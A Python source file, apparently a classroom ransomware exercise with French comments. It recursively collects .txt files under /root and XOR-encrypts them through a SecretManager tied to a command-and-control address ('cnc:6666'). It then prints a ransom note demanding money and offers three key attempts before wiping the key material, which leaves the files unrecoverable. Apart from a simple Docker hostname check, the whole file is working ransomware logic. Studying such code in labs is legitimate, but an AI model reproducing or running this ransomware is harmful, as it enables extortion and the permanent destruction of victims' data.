import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"
NB_ESSAIS = 3 

# ENCRYPT_MESSAGE = """
#   _____                                                                                           
#  |  __ \                                                                                          
#  | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
#  |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
#  | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
#  |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
#                 | |                      __/ |                                               __/ |
#                 |_|                     |___/                                               |___/ 

# Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
# """

ENCRYPT_MESSAGE = """

⠀⠀⠀⠀⠀⢸⠓⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                            ⠀⠀⠀⠀⠀⢸⠓⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⠀⠀⠑⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                          ⠀⠀⠀⠀⠀⢸⠀⠀⠑⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠙⢤⡷⣤⣦⣀⠤⠖⠚⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀                          ⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠙⢤⡷⣤⣦⣀⠤⠖⠚⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣠⡿⠢⢄⡀⠀⡇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠸⠷⣶⠂⠀⠀⠀⣀⣀⠀⠀⠀                          ⣠⡿⠢⢄⡀⠀⡇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠸⠷⣶⠂⠀⠀⠀⣀⣀⠀⠀⠀
⢸⣃⠀⠀⠉⠳⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⢉⡭⠋                          ⢸⣃⠀⠀⠉⠳⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⢉⡭⠋
⠀⠘⣆⠀⠀⠀⠁⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀                          ⠀⠘⣆⠀⠀⠀⠁⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀
⠀⠀⠘⣦⠆⠀⠀⢀⡎⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⡀⣠⠔⠋⠀⠀⠀⠀                          ⠀⠀⠘⣦⠆⠀⠀⢀⡎⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⡀⣠⠔⠋⠀⠀⠀⠀
⠀⠀⠀⡏⠀⠀⣆⠘⣄⠸⢧⠀⠀⠀⠀⢀⣠⠖⢻⠀⠀⠀⣿⢥⣄⣀⣀⣀⠀⠀                          ⠀⠀⠀⡏⠀⠀⣆⠘⣄⠸⢧⠀⠀⠀⠀⢀⣠⠖⢻⠀⠀⠀⣿⢥⣄⣀⣀⣀⠀⠀
⠀⠀⢸⠁⠀⠀⡏⢣⣌⠙⠚⠀⠀⠠⣖⡛⠀⣠⠏⠀⠀⠀⠇⠀⠀⠀⠀⢙⣣⠄     ABOULE LA FLOUZ      ⠀⠀⢸⠁⠀⠀⡏⢣⣌⠙⠚⠀⠀⠠⣖⡛⠀⣠⠏⠀⠀⠀⠇⠀⠀⠀⠀⢙⣣⠄
⠀⠀⢸⡀⠀⠀⠳⡞⠈⢻⠶⠤⣄⣀⣈⣉⣉⣡⡔⠀⠀⢀⠀⠀⣀⡤⠖⠚⠀⠀                          ⠀⠀⢸⡀⠀⠀⠳⡞⠈⢻⠶⠤⣄⣀⣈⣉⣉⣡⡔⠀⠀⢀⠀⠀⣀⡤⠖⠚⠀⠀
⠀⠀⡼⣇⠀⠀⠀⠙⠦⣞⡀⠀⢀⡏⠀⢸⣣⠞⠀⠀⠀⡼⠚⠋⠁⠀⠀⠀⠀⠀                          ⠀⠀⡼⣇⠀⠀⠀⠙⠦⣞⡀⠀⢀⡏⠀⢸⣣⠞⠀⠀⠀⡼⠚⠋⠁⠀⠀⠀⠀⠀
⠀⢰⡇⠙⠀⠀⠀⠀⠀⠀⠉⠙⠚⠒⠚⠉⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀                          ⠀⢰⡇⠙⠀⠀⠀⠀⠀⠀⠉⠙⠚⠒⠚⠉⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢧⡀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀                          ⠀⠀⢧⡀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠙⣶⣶⣿⠢⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                          ⠀⠀⠀⠙⣶⣶⣿⠢⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⢿⣳⠞⠳⡄⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                          ⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⢿⣳⠞⠳⡄⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠹⣄⣀⡤⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠹⣄⣀⡤⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


TES FICHIERS TXT ONT ÉTÉ CHIFFRÉS. ALORS SI TU VEUX LES RÉCUPERER, IL VA FALLOIR PAYER MOUAHAHAH. ABOULE LE FLOUZ.

En vrai envoie ce que tu veux, c'est tellement la crise que je prends n'importe quoi, même un paypal, je suis plutôt sympa non ?
"""


DECRYPT_MESSAGE = """

⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠴⠒⠚⠉⠉⠉⠉⠙⠒⠲⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀            C'EST         ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠴⠒⠚⠉⠉⠉⠉⠙⠒⠲⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀  
⠀⠀⠀⠀⠀⢀⡴⠞⠁⠁⠀⠀⢀⣀⣀⣀⣄⣀⡀⠀⡀⠈⠙⠶⣄⠀⠀⠀⠀⠀            ZARBI         ⠀⠀⠀⠀⠀⢀⡴⠞⠁⠁⠀⠀⢀⣀⣀⣀⣄⣀⡀⠀⡀⠈⠙⠶⣄⠀⠀⠀⠀⠀  
⠀⠀⠀⢀⣴⠍⠀⠀⣀⡤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠑⠢⢤⣠⡄⠙⢷⣄⠀⠀⠀             TES          ⠀⠀⠀⢀⣴⠍⠀⠀⣀⡤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠑⠢⢤⣠⡄⠙⢷⣄⠀⠀⠀  
⠀⠀⣰⡻⠃⠀⣠⠞⠁⠀⠀⢀⣀⠤⠤⠤⠤⢄⣀⠀⢀⣴⠿⠀⣤⠀⢙⢧⡀⠀           FICHIERS       ⠀⠀⣰⡻⠃⠀⣠⠞⠁⠀⠀⢀⣀⠤⠤⠤⠤⢄⣀⠀⢀⣴⠿⠀⣤⠀⢙⢧⡀⠀  
⠀⣰⠛⠀⠀⡴⠃⠀⠀⣠⡞⠉⠀⠀⠀⠀⠀⠀⠈⠙⠿⣏⡀⣠⠚⡅⠀⠈⢳⠀             TXT          ⠀⣰⠛⠀⠀⡴⠃⠀⠀⣠⡞⠉⠀⠀⠀⠀⠀⠀⠈⠙⠿⣏⡀⣠⠚⡅⠀⠈⢳⠀  
⢠⠟⠀⠀⡸⠀⠀⢀⣾⠋⠀⢀⡤⠒⠊⠉⠓⠲⣤⡔⠀⠙⣟⠁⠀⠘⡄⠀⠀⢇            SONT          ⢠⠟⠀⠀⡸⠀⠀⢀⣾⠋⠀⢀⡤⠒⠊⠉⠓⠲⣤⡔⠀⠙⣟⠁⠀⠘⡄⠀⠀⢇  
⣸⠀⠀⢰⠃⠀⠀⡾⠇⠀⣰⠋⠀⠀⠀⠀⠀⠀⠈⠻⡁⠀⠘⡆⠀⠀⢹⠀⠀⢸          REAPPARUS       ⣸⠀⠀⢰⠃⠀⠀⡾⠇⠀⣰⠋⠀⠀⠀⠀⠀⠀⠈⠻⡁⠀⠘⡆⠀⠀⢹⠀⠀⢸  
⡇⠀⠀⠉⠉⠉⣿⡇⠀⣴⠇⠀⠀⢠⣾⠛⣦⠀⠀⠀⢧⡄⠀⣿⠀⠀⠘⡆⠀ ⢸                         ⡇⠀⠀⠉⠉⠉⣿⡇⠀⣴⠇⠀⠀⢠⣾⠛⣦⠀⠀⠀⢧⡄⠀⣿⠀⠀⠘⡆⠀ ⢸ 
⠳⣄⣀⣀⣀⣀⣽⡠⠀⢨⡇⠀⠀⠘⢿⣿⠟⠀⠀⠀⣾⠁⠀⣹⠀⠀⢠⡇⠀ ⢸           ALORS         ⠳⣄⣀⣀⣀⣀⣽⡠⠀⢨⡇⠀⠀⠘⢿⣿⠟⠀⠀⠀⣾⠁⠀⣹⠀⠀⢠⡇⠀ ⢸ 
⠀⠀⠀⠀⠀⠀⠀⢷⣥⠀⠹⣄⢀⠀⠀⠀⠀⢀⠄⡾⠅⠀⢠⡇⠀⠀⣸⠀⠀⢰            ENCORE        ⠀⠀⠀⠀⠀⠀⠀⢷⣥⠀⠹⣄⢀⠀⠀⠀⠀⢀⠄⡾⠅⠀⢠⡇⠀⠀⣸⠀⠀⢰  
⠀⠀⠀⠀⠀⠀⠀⠈⢿⣄⠀⢈⠓⠤⢅⣀⡥⠴⠏⠁⠀⣠⠞⠀⠀⢠⡇⠀⠀⡞            MILLE             ⠀⠀⠀⠀⠈⢿⣄⠀⢈⠓⠤⢅⣀⡥⠴⠏⠁⠀⣠⠞⠀⠀⢠⡇⠀⠀⡞  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠀⠀⠀⠀⠀⠀⠀⣠⠖⠃⠀⠀⣠⠋⠀⠀⣰⠁            MERCI         ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠀⠀⠀⠀⠀⠀⠀⣠⠖⠃⠀⠀⣠⠋⠀⠀⣰⠁  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠒⠒⠒⠚⠉⠀⠀⠀⣠⠞⠋⠀⢠⡾⠁⠀             POUR         ⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠈⠙⠒⠒⠒⠒⠚⠉⠀⠀⠀⣠⠞⠋⠀⢠⡾⠁⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡴⠎⠁⠀⠀⣠⠟⠀⠀⠀              TA          ⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡴⠎⠁⠀⠀⣠⠟⠀⠀⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⠉⠩⠉⠁⠀⠀⠀⣀⡶⠋⠁⠀⠀⠀          PARTICIPATION    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⠉⠩⠉⠁⠀⠀⠀⣀⡶⠋⠁⠀⠀⠀   
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠣⠀⢰⣄⠤⠴⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀          FINANCIÈRE      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠣⠀⢰⣄⠤⠴⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⣀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀             LA BISE       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⣀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀      
"""


MESSAGE_pseudo_TERRIFIANT = "C'est le dernier essai, ATTENTION !!!!!!!!!!"





class Ransomware:

    # Nombre d'essais avant que le virus s'auto-efface sans déchiffrer les fichiers

    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:

        # Indique que le début de la recherche des fichiers se fait depuis le répertoire du fichier
        p = Path("/root")
        # Recherche et stock les chemins absolus des fichiers correspondant avec le filtre
        files = p.rglob("*" + filter) 

        # Transforme list_file (objet Path.rglob) en list
        list_files = list(files) 
 
        # return all files matching the filter
        return list_files

    def encrypt(self):
        
        # Liste des fichiers correspondants au filtre
        filtre = ".txt"
        list_files_to_encrypt = self.get_files(filtre)

        # Création d"un objet SecretManager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)

        # Appel de la fonction setup
        secret_manager.setup()

        # Chiffrement des fichiers
        secret_manager.xorfiles(list_files_to_encrypt)

        # Affichage du message
        print(ENCRYPT_MESSAGE)

              
    def decrypt(self) -> None:
        
        # Création d'un objet SecretManager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)

        # Chargement des valeurs cryptographiques
        secret_manager.load()

        # Nombre de tentatives d'insertion de la clé 
        nb_tentatives = 0 

        while nb_tentatives < NB_ESSAIS:

            # Réglage de la clé
            print(f"Saisissez la clé, essais numéro {nb_tentatives+1}/{NB_ESSAIS} : ")

            # Si c'est la dernière tentative disponible, on affiche un message ""terrifiant""
            if(nb_tentatives+1 == NB_ESSAIS):

                # Message ""terrifiant""
                print(MESSAGE_pseudo_TERRIFIANT)
                
            # Saisie de la clé
            key_input = input()
            
            try:
                # Vérifie si la clé saisie est bonne, sinon cela génère une erreur dans le self.set_key.
                secret_manager.set_key(key_input)

                # Pour sortir de la boucle while
                break

            except ValueError as e:

                # Mise à jour du nombre de nombre de tentatives
                nb_tentatives += 1

                # Si c'était la dernière tentative, nettoyage et sortie du "ransomware"
                if(nb_tentatives == NB_ESSAIS):

                    # Nettoyage des fichiers 
                    secret_manager.clean()
                    
                    # Sortie du ransomware
                    return 

        # Récupération des fichiers à déchiffrer
        filtre = ".txt"
        list_files_to_decrypt = self.get_files(filtre)

        # Déchiffrement des fichiers
        secret_manager.xorfiles(list_files_to_decrypt)

        # Suppressions des fichiers comprométants
        secret_manager.clean()

        # Affichage du message
        print(DECRYPT_MESSAGE)


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
        ransomware.decrypt() # Permet de demander directement la clé de déchiffrement.
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()